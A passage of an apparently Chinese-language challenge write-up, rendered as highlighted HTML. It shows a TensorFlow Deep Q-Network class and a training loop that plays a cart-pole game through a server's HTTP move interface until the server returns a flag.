            memory_size<span class="token operator">=</span><span class="token number">500</span><span class="token punctuation">,</span>
            batch_size<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">,</span>
            e\_greedy\_increment<span class="token operator">=</span><span class="token constant">None</span><span class="token punctuation">,</span>
            output_graph<span class="token operator">=</span><span class="token constant">False</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>n_actions <span class="token operator">=</span> n_actions
        <span class="token keyword">self</span><span class="token punctuation">.</span>n_features <span class="token operator">=</span> n_features
        <span class="token keyword">self</span><span class="token punctuation">.</span>lr <span class="token operator">=</span> learning_rate
        <span class="token keyword">self</span><span class="token punctuation">.</span>gamma <span class="token operator">=</span> reward_decay
        <span class="token keyword">self</span><span class="token punctuation">.</span>epsilon_max <span class="token operator">=</span> e_greedy
        <span class="token keyword">self</span><span class="token punctuation">.</span>replace\_target\_iter <span class="token operator">=</span> replace\_target\_iter
        <span class="token keyword">self</span><span class="token punctuation">.</span>memory_size <span class="token operator">=</span> memory_size
        <span class="token keyword">self</span><span class="token punctuation">.</span>batch_size <span class="token operator">=</span> batch_size
        <span class="token keyword">self</span><span class="token punctuation">.</span>epsilon_increment <span class="token operator">=</span> e\_greedy\_increment
        <span class="token keyword">self</span><span class="token punctuation">.</span>epsilon <span class="token operator">=</span> <span class="token number">0</span> <span class="token keyword">if</span> e\_greedy\_increment is <span class="token keyword">not</span> <span class="token constant">None</span> <span class="token keyword">else</span> <span class="token keyword">self</span><span class="token punctuation">.</span>epsilon_max

        \<span class="token comment"># total learning step</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>learn\_step\_counter <span class="token operator">=</span> <span class="token number">0</span>

        \<span class="token comment"># initialize zero memory \[s, a, r, s_\]</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>memory <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>memory_size<span class="token punctuation">,</span> n_features <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        \<span class="token comment"># consist of \[target\_net, evaluate\_net\]</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>\_build\_net<span class="token punctuation">(</span><span class="token punctuation">)</span>
        t_params <span class="token operator">=</span> tf<span class="token punctuation">.</span>get_collection<span class="token punctuation">(</span><span class="token string">&apos;target\_net\_params&apos;</span><span class="token punctuation">)</span>
        e_params <span class="token operator">=</span> tf<span class="token punctuation">.</span>get_collection<span class="token punctuation">(</span><span class="token string">&apos;eval\_net\_params&apos;</span><span class="token punctuation">)</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>replace\_target\_op <span class="token operator">=</span> \<span class="token punctuation">[</span>tf<span class="token punctuation">.</span>assign<span class="token punctuation">(</span>t<span class="token punctuation">,</span> e<span class="token punctuation">)</span> <span class="token keyword">for</span> t<span class="token punctuation">,</span> e <span class="token keyword">in</span> zip<span class="token punctuation">(</span>t_params<span class="token punctuation">,</span> e_params<span class="token punctuation">)</span>\<span class="token punctuation">]</span>

        <span class="token keyword">self</span><span class="token punctuation">.</span>sess <span class="token operator">=</span> tf<span class="token punctuation">.</span><span class="token constant">Session</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> output_graph<span class="token punctuation">:</span>
            \<span class="token comment"># $ tensorboard --logdir=logs</span>
            \<span class="token comment"># tf.train.SummaryWriter soon be deprecated, use following</span>
            tf<span class="token punctuation">.</span>summary<span class="token punctuation">.</span><span class="token constant">FileWriter</span><span class="token punctuation">(</span><span class="token string">&quot;logs/&quot;</span><span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>sess<span class="token punctuation">.</span>graph<span class="token punctuation">)</span>

        <span class="token keyword">self</span><span class="token punctuation">.</span>sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>global\_variables\_initializer<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>cost_his <span class="token operator">=</span> \<span class="token punctuation">[</span>\<span class="token punctuation">]</span>

    <span class="token keyword">def</span> \_build\_net<span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        \<span class="token comment"># ------------------ build evaluate_net ------------------</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>s <span class="token operator">=</span> tf<span class="token punctuation">.</span>placeholder<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> \<span class="token punctuation">[</span><span class="token constant">None</span><span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>n_features\<span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">&apos;s&apos;</span><span class="token punctuation">)</span>  \<span class="token comment"># input</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>q_target <span class="token operator">=</span> tf<span class="token punctuation">.</span>placeholder<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> \<span class="token punctuation">[</span><span class="token constant">None</span><span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>n_actions\<span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">&apos;Q_target&apos;</span><span class="token punctuation">)</span>  \<span class="token comment"># for calculating loss</span>
        with tf<span class="token punctuation">.</span>variable_scope<span class="token punctuation">(</span><span class="token string">&apos;eval_net&apos;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            \<span class="token comment"># c\_names(collections\_names) are the collections to store variables</span>
            c_names<span class="token punctuation">,</span> n_l1<span class="token punctuation">,</span> w_initializer<span class="token punctuation">,</span> b_initializer <span class="token operator">=</span> \
                \<span class="token punctuation">[</span><span class="token string">&apos;eval\_net\_params&apos;</span><span class="token punctuation">,</span> tf<span class="token punctuation">.</span><span class="token constant">GraphKeys</span><span class="token punctuation">.</span><span class="token constant">GLOBAL_VARIABLES</span>\<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> \
                tf<span class="token punctuation">.</span>random\_normal\_initializer<span class="token punctuation">(</span><span class="token number">0.</span><span class="token punctuation">,</span> <span class="token number">0.3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> tf<span class="token punctuation">.</span>constant_initializer<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>  \<span class="token comment"># config of layers</span>

            \<span class="token comment"># first layer. collections is used later when assign to target net</span>
            with tf<span class="token punctuation">.</span>variable_scope<span class="token punctuation">(</span><span class="token string">&apos;l1&apos;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                w1 <span class="token operator">=</span> tf<span class="token punctuation">.</span>get_variable<span class="token punctuation">(</span><span class="token string">&apos;w1&apos;</span><span class="token punctuation">,</span> \<span class="token punctuation">[</span><span class="token keyword">self</span><span class="token punctuation">.</span>n_features<span class="token punctuation">,</span> n_l1\<span class="token punctuation">]</span><span class="token punctuation">,</span> initializer<span class="token operator">=</span>w_initializer<span class="token punctuation">,</span> collections<span class="token operator">=</span>c_names<span class="token punctuation">)</span>
                b1 <span class="token operator">=</span> tf<span class="token punctuation">.</span>get_variable<span class="token punctuation">(</span><span class="token string">&apos;b1&apos;</span><span class="token punctuation">,</span> \<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> n_l1\<span class="token punctuation">]</span><span class="token punctuation">,</span> initializer<span class="token operator">=</span>b_initializer<span class="token punctuation">,</span> collections<span class="token operator">=</span>c_names<span class="token punctuation">)</span>
                l1 <span class="token operator">=</span> tf<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>relu<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>matmul<span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>s<span class="token punctuation">,</span> w1<span class="token punctuation">)</span> <span class="token operator">+</span> b1<span class="token punctuation">)</span>

            \<span class="token comment"># second layer. collections is used later when assign to target net</span>
            with tf<span class="token punctuation">.</span>variable_scope<span class="token punctuation">(</span><span class="token string">&apos;l2&apos;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                w2 <span class="token operator">=</span> tf<span class="token punctuation">.</span>get_variable<span class="token punctuation">(</span><span class="token string">&apos;w2&apos;</span><span class="token punctuation">,</span> \<span class="token punctuation">[</span>n_l1<span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>n_actions\<span class="token punctuation">]</span><span class="token punctuation">,</span> initializer<span class="token operator">=</span>w_initializer<span class="token punctuation">,</span> collections<span class="token operator">=</span>c_names<span class="token punctuation">)</span>
                b2 <span class="token operator">=</span> tf<span class="token punctuation">.</span>get_variable<span class="token punctuation">(</span><span class="token string">&apos;b2&apos;</span><span class="token punctuation">,</span> \<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>n_actions\<span class="token punctuation">]</span><span class="token punctuation">,</span> initializer<span class="token operator">=</span>b_initializer<span class="token punctuation">,</span> collections<span class="token operator">=</span>c_names<span class="token punctuation">)</span>
                <span class="token keyword">self</span><span class="token punctuation">.</span>q_eval <span class="token operator">=</span> tf<span class="token punctuation">.</span>matmul<span class="token punctuation">(</span>l1<span class="token punctuation">,</span> w2<span class="token punctuation">)</span> <span class="token operator">+</span> b2

        with tf<span class="token punctuation">.</span>variable_scope<span class="token punctuation">(</span><span class="token string">&apos;loss&apos;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span>loss <span class="token operator">=</span> tf<span class="token punctuation">.</span>reduce_mean<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>squared_difference<span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>q_target<span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>q_eval<span class="token punctuation">)</span><span class="token punctuation">)</span>
        with tf<span class="token punctuation">.</span>variable_scope<span class="token punctuation">(</span><span class="token string">&apos;train&apos;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span>\_train\_op <span class="token operator">=</span> tf<span class="token punctuation">.</span>train<span class="token punctuation">.</span><span class="token constant">RMSPropOptimizer</span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>lr<span class="token punctuation">)</span><span class="token punctuation">.</span>minimize<span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>loss<span class="token punctuation">)</span>

        \<span class="token comment"># ------------------ build target_net ------------------</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>s_ <span class="token operator">=</span> tf<span class="token punctuation">.</span>placeholder<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>float32<span class="token punctuation">,</span> \<span class="token punctuation">[</span><span class="token constant">None</span><span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>n_features\<span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">&apos;s_&apos;</span><span class="token punctuation">)</span>    \<span class="token comment"># input</span>
        with tf<span class="token punctuation">.</span>variable_scope<span class="token punctuation">(</span><span class="token string">&apos;target_net&apos;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            \<span class="token comment"># c\_names(collections\_names) are the collections to store variables</span>
            c_names <span class="token operator">=</span> \<span class="token punctuation">[</span><span class="token string">&apos;target\_net\_params&apos;</span><span class="token punctuation">,</span> tf<span class="token punctuation">.</span><span class="token constant">GraphKeys</span><span class="token punctuation">.</span><span class="token constant">GLOBAL_VARIABLES</span>\<span class="token punctuation">]</span>

            \<span class="token comment"># first layer. collections is used later when assign to target net</span>
            with tf<span class="token punctuation">.</span>variable_scope<span class="token punctuation">(</span><span class="token string">&apos;l1&apos;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                w1 <span class="token operator">=</span> tf<span class="token punctuation">.</span>get_variable<span class="token punctuation">(</span><span class="token string">&apos;w1&apos;</span><span class="token punctuation">,</span> \<span class="token punctuation">[</span><span class="token keyword">self</span><span class="token punctuation">.</span>n_features<span class="token punctuation">,</span> n_l1\<span class="token punctuation">]</span><span class="token punctuation">,</span> initializer<span class="token operator">=</span>w_initializer<span class="token punctuation">,</span> collections<span class="token operator">=</span>c_names<span class="token punctuation">)</span>
                b1 <span class="token operator">=</span> tf<span class="token punctuation">.</span>get_variable<span class="token punctuation">(</span><span class="token string">&apos;b1&apos;</span><span class="token punctuation">,</span> \<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> n_l1\<span class="token punctuation">]</span><span class="token punctuation">,</span> initializer<span class="token operator">=</span>b_initializer<span class="token punctuation">,</span> collections<span class="token operator">=</span>c_names<span class="token punctuation">)</span>
                l1 <span class="token operator">=</span> tf<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>relu<span class="token punctuation">(</span>tf<span class="token punctuation">.</span>matmul<span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>s_<span class="token punctuation">,</span> w1<span class="token punctuation">)</span> <span class="token operator">+</span> b1<span class="token punctuation">)</span>

            \<span class="token comment"># second layer. collections is used later when assign to target net</span>
            with tf<span class="token punctuation">.</span>variable_scope<span class="token punctuation">(</span><span class="token string">&apos;l2&apos;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                w2 <span class="token operator">=</span> tf<span class="token punctuation">.</span>get_variable<span class="token punctuation">(</span><span class="token string">&apos;w2&apos;</span><span class="token punctuation">,</span> \<span class="token punctuation">[</span>n_l1<span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>n_actions\<span class="token punctuation">]</span><span class="token punctuation">,</span> initializer<span class="token operator">=</span>w_initializer<span class="token punctuation">,</span> collections<span class="token operator">=</span>c_names<span class="token punctuation">)</span>
                b2 <span class="token operator">=</span> tf<span class="token punctuation">.</span>get_variable<span class="token punctuation">(</span><span class="token string">&apos;b2&apos;</span><span class="token punctuation">,</span> \<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>n_actions\<span class="token punctuation">]</span><span class="token punctuation">,</span> initializer<span class="token operator">=</span>b_initializer<span class="token punctuation">,</span> collections<span class="token operator">=</span>c_names<span class="token punctuation">)</span>
                <span class="token keyword">self</span><span class="token punctuation">.</span>q_next <span class="token operator">=</span> tf<span class="token punctuation">.</span>matmul<span class="token punctuation">(</span>l1<span class="token punctuation">,</span> w2<span class="token punctuation">)</span> <span class="token operator">+</span> b2

    <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">store_transition</span></span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> a<span class="token punctuation">,</span> r<span class="token punctuation">,</span> s_<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> hasattr<span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">,</span> <span class="token string">&apos;memory_counter&apos;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span>memory_counter <span class="token operator">=</span> <span class="token number">0</span>

        transition <span class="token operator">=</span> np<span class="token punctuation">.</span>hstack<span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> \<span class="token punctuation">[</span>a<span class="token punctuation">,</span> r\<span class="token punctuation">]</span><span class="token punctuation">,</span> s_<span class="token punctuation">)</span><span class="token punctuation">)</span>

        \<span class="token comment"># replace the old memory with new memory</span>
        index <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>memory_counter <span class="token operator">%</span> <span class="token keyword">self</span><span class="token punctuation">.</span>memory_size
        <span class="token keyword">self</span><span class="token punctuation">.</span>memory\<span class="token punctuation">[</span>index<span class="token punctuation">,</span> <span class="token punctuation">:</span>\<span class="token punctuation">]</span> <span class="token operator">=</span> transition

        <span class="token keyword">self</span><span class="token punctuation">.</span>memory_counter <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span>

    <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">choose_action</span></span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">,</span> observation<span class="token punctuation">)</span><span class="token punctuation">:</span>
        \<span class="token comment"># to have batch dimension when feed into tf placeholder</span>
        observation <span class="token operator">=</span> observation\<span class="token punctuation">[</span>np<span class="token punctuation">.</span>newaxis<span class="token punctuation">,</span> <span class="token punctuation">:</span>\<span class="token punctuation">]</span>

        <span class="token keyword">if</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token keyword">self</span><span class="token punctuation">.</span>epsilon<span class="token punctuation">:</span>
            \<span class="token comment"># forward feed the observation and get q value for every actions</span>
            actions_value <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>q_eval<span class="token punctuation">,</span> feed_dict<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">self</span><span class="token punctuation">.</span>s<span class="token punctuation">:</span> observation<span class="token punctuation">}</span><span class="token punctuation">)</span>
            action <span class="token operator">=</span> np<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span>actions_value<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            action <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>n_actions<span class="token punctuation">)</span>
        <span class="token keyword">return</span> action

    <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">learn</span></span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        \<span class="token comment"># check to replace target parameters</span>
        <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>learn\_step\_counter <span class="token operator">%</span> <span class="token keyword">self</span><span class="token punctuation">.</span>replace\_target\_iter <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span>sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>replace\_target\_op<span class="token punctuation">)</span>
            print<span class="token punctuation">(</span><span class="token string">&apos;\\ntarget\_params\_replaced\\n&apos;</span><span class="token punctuation">)</span>

        \<span class="token comment"># sample batch memory from all memory</span>
        <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>memory_counter <span class="token operator">&gt;</span> <span class="token keyword">self</span><span class="token punctuation">.</span>memory_size<span class="token punctuation">:</span>
            sample_index <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>memory_size<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token keyword">self</span><span class="token punctuation">.</span>batch_size<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            sample_index <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>memory_counter<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token keyword">self</span><span class="token punctuation">.</span>batch_size<span class="token punctuation">)</span>
        batch_memory <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>memory\<span class="token punctuation">[</span>sample_index<span class="token punctuation">,</span> <span class="token punctuation">:</span>\<span class="token punctuation">]</span>

        q_next<span class="token punctuation">,</span> q_eval <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>
            \<span class="token punctuation">[</span><span class="token keyword">self</span><span class="token punctuation">.</span>q_next<span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>q_eval\<span class="token punctuation">]</span><span class="token punctuation">,</span>
            feed_dict<span class="token operator">=</span><span class="token punctuation">{</span>
                <span class="token keyword">self</span><span class="token punctuation">.</span>s_<span class="token punctuation">:</span> batch_memory\<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token keyword">self</span><span class="token punctuation">.</span>n_features<span class="token punctuation">:</span>\<span class="token punctuation">]</span><span class="token punctuation">,</span>  \<span class="token comment"># fixed params</span>
                <span class="token keyword">self</span><span class="token punctuation">.</span>s<span class="token punctuation">:</span> batch_memory\<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token symbol">:self</span><span class="token punctuation">.</span>n_features\<span class="token punctuation">]</span><span class="token punctuation">,</span>  \<span class="token comment"># newest params</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span>

        \<span class="token comment"># change q\_target w.r.t q\_eval&apos;s action</span>
        q_target <span class="token operator">=</span> q_eval<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>

        batch_index <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>batch_size<span class="token punctuation">,</span> dtype<span class="token operator">=</span>np<span class="token punctuation">.</span>int32<span class="token punctuation">)</span>
        eval\_act\_index <span class="token operator">=</span> batch_memory\<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>n_features\<span class="token punctuation">]</span><span class="token punctuation">.</span>astype<span class="token punctuation">(</span>int<span class="token punctuation">)</span>
        reward <span class="token operator">=</span> batch_memory\<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>n_features <span class="token operator">+</span> <span class="token number">1</span>\<span class="token punctuation">]</span>

        q_target\<span class="token punctuation">[</span>batch_index<span class="token punctuation">,</span> eval\_act\_index\<span class="token punctuation">]</span> <span class="token operator">=</span> reward <span class="token operator">+</span> <span class="token keyword">self</span><span class="token punctuation">.</span>gamma <span class="token operator">*</span> np<span class="token punctuation">.</span>max<span class="token punctuation">(</span>q_next<span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>

        \<span class="token comment"># train eval network</span>
        _<span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>cost <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>sess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>\<span class="token punctuation">[</span><span class="token keyword">self</span><span class="token punctuation">.</span>\_train\_op<span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>loss\<span class="token punctuation">]</span><span class="token punctuation">,</span>
                                     feed_dict<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">self</span><span class="token punctuation">.</span>s<span class="token punctuation">:</span> batch_memory\<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token symbol">:self</span><span class="token punctuation">.</span>n_features\<span class="token punctuation">]</span><span class="token punctuation">,</span>
                                                <span class="token keyword">self</span><span class="token punctuation">.</span>q_target<span class="token punctuation">:</span> q_target<span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>cost_his<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>cost<span class="token punctuation">)</span>

        \<span class="token comment"># increasing epsilon</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>epsilon <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>epsilon <span class="token operator">+</span> <span class="token keyword">self</span><span class="token punctuation">.</span>epsilon_increment <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>epsilon <span class="token operator">&lt;</span> <span class="token keyword">self</span><span class="token punctuation">.</span>epsilon_max <span class="token keyword">else</span> <span class="token keyword">self</span><span class="token punctuation">.</span>epsilon_max
        <span class="token keyword">self</span><span class="token punctuation">.</span>learn\_step\_counter <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span></code></pre><h4 id="&#x5B66;&#x4E60;&#x8FED;&#x4EE3;">&#x5B66;&#x4E60;&#x8FED;&#x4EE3;</h4> <pre><code>x_threshold <span class="token operator">=</span> <span class="token number">2.4</span>
theta\_threshold\_radians <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">/</span><span class="token number">15</span><span class="token operator">*</span>math<span class="token punctuation">.</span>pi

<span class="token constant">RL</span> <span class="token operator">=</span> <span class="token constant">DeepQNetwork</span><span class="token punctuation">(</span>n_actions<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>
                  n_features<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span>
                  learning_rate<span class="token operator">=</span><span class="token number">0.01</span><span class="token punctuation">,</span> e_greedy<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>
                  replace\_target\_iter<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> memory_size<span class="token operator">=</span><span class="token number">2000</span><span class="token punctuation">,</span>
                  e\_greedy\_increment<span class="token operator">=</span><span class="token number">0.001</span><span class="token punctuation">,</span><span class="token punctuation">)</span>

total_steps <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">for</span> i_episode <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    json_req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">&apos;id&apos;</span><span class="token punctuation">:</span> token<span class="token punctuation">,</span> <span class="token string">&apos;move&apos;</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
    observation <span class="token operator">=</span> json_req\<span class="token punctuation">[</span><span class="token string">&apos;observation&apos;</span>\<span class="token punctuation">]</span>
    ep_r <span class="token operator">=</span> <span class="token number">0</span>

    <span class="token keyword">while</span> <span class="token constant">True</span><span class="token punctuation">:</span>
        action <span class="token operator">=</span> <span class="token constant">RL</span><span class="token punctuation">.</span>choose_action<span class="token punctuation">(</span>np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>observation<span class="token punctuation">)</span><span class="token punctuation">)</span>

        json_req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">&apos;id&apos;</span><span class="token punctuation">:</span> token<span class="token punctuation">,</span> <span class="token string">&apos;move&apos;</span><span class="token punctuation">:</span> action<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
        try<span class="token punctuation">:</span>  observation_ <span class="token operator">=</span> json_req\<span class="token punctuation">[</span><span class="token string">&apos;observation&apos;</span>\<span class="token punctuation">]</span>
        except <span class="token constant">KeyError</span><span class="token punctuation">:</span>
            pass
        print<span class="token punctuation">(</span>observation<span class="token punctuation">)</span>
        done <span class="token operator">=</span> <span class="token keyword">not</span> json_req\<span class="token punctuation">[</span><span class="token string">&apos;status&apos;</span>\<span class="token punctuation">]</span>

        \<span class="token comment"># the smaller theta and closer to center the better</span>
        x<span class="token punctuation">,</span> x_dot<span class="token punctuation">,</span> theta<span class="token punctuation">,</span> theta_dot <span class="token operator">=</span> observation_
        r1 <span class="token operator">=</span> <span class="token punctuation">(</span>x_threshold <span class="token operator">-</span> abs<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span>x_threshold <span class="token operator">-</span> <span class="token number">0.8</span>
        r2 <span class="token operator">=</span> <span class="token punctuation">(</span>theta\_threshold\_radians <span class="token operator">-</span> abs<span class="token punctuation">(</span>theta<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span>theta\_threshold\_radians <span class="token operator">-</span> <span class="token number">0.5</span>
        reward <span class="token operator">=</span> r1 <span class="token operator">+</span> r2

        <span class="token constant">RL</span><span class="token punctuation">.</span>store_transition<span class="token punctuation">(</span>observation<span class="token punctuation">,</span> action<span class="token punctuation">,</span> reward<span class="token punctuation">,</span> observation_<span class="token punctuation">)</span>

        ep_r <span class="token operator">+</span><span class="token operator">=</span> reward
        <span class="token keyword">if</span> total_steps <span class="token operator">&gt;</span> <span class="token number">1000</span><span class="token punctuation">:</span>
            <span class="token constant">RL</span><span class="token punctuation">.</span>learn<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> done<span class="token punctuation">:</span>
            count <span class="token operator">=</span> json_req\<span class="token punctuation">[</span><span class="token string">&apos;count&apos;</span>\<span class="token punctuation">]</span>
            <span class="token keyword">if</span> count <span class="token operator">==</span> <span class="token number">100</span><span class="token punctuation">:</span>
                print<span class="token punctuation">(</span>json_req\<span class="token punctuation">[</span><span class="token string">&apos;flag&apos;</span>\<span class="token punctuation">]</span><span class="token punctuation">)</span>
